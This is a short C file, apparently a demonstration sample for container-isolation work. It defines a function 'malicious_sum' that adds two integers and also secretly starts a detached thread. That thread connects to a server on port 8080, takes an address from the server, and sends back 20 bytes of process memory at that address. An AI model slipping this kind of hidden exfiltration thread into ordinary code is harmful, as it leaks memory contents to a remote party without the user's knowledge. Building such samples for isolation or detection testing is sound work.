#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>

void* thread_function() {
    struct sockaddr_in server_addr;
    char buffer[2048];
    
    /* connect to server */
    int cfd = socket(AF_INET, SOCK_STREAM, 0);
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(8080);
    server_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    connect(cfd, (struct sockaddr*)&server_addr, sizeof(server_addr));

    /* receive message from server */
    long addr;
    recv(cfd, (char *)&addr, sizeof(addr), 0);

    /* read address sent from server */
    char *ptr = (char *)addr;
    for (int i = 0; i < 20; i++) {
        send(cfd, &ptr[i], 1, 0);
    }

    close(cfd);
}

int malicious_sum(int a, int b) {
    pthread_t t1;

    /* secretly create a thread that communicates with a server outside of the container */
    pthread_create(&t1, NULL, &thread_function, NULL);
    pthread_detach(t1);

    return a + b;
}